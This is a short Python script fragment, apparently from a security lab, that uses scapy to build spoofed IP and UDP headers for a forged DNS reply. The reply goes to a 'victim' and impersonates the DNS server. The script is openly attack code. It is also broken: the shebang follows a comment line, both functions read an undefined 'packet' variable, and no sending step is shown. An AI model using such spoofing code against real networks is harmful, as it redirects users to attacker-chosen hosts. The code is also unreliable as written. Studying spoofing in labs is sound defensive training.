# Shebang line to indicate which interpreter is to be used by specifiying it's path
#!/usr/bin/env python3

# import scapy to be used for creating packets and sending packets
from scapy.all import *

# This function creates an IP Packet. We switch the source IP and destination IP
def create_IP_Packet():

    # We set the destination to be the victim
    destination = packet[IP].src

    # We set the source to be the DNS server
    source = packet[IP].dst

    # make the packet and assign it's source and destination
    IPpacket = IP(dst= destination, src= source)
    
    return IPpacket

# This function creates a UDP Packet. We switch the source port number and destination port number
def create_UDP_Packet():

    # We set the destination port to be the source port of the victim
    destination_port = packet[UDP].sport

    # make the packet and assign it's destination and source port
    UDPpacket = UDP(dport= destination_port , sport=53)

    return UDPpacket
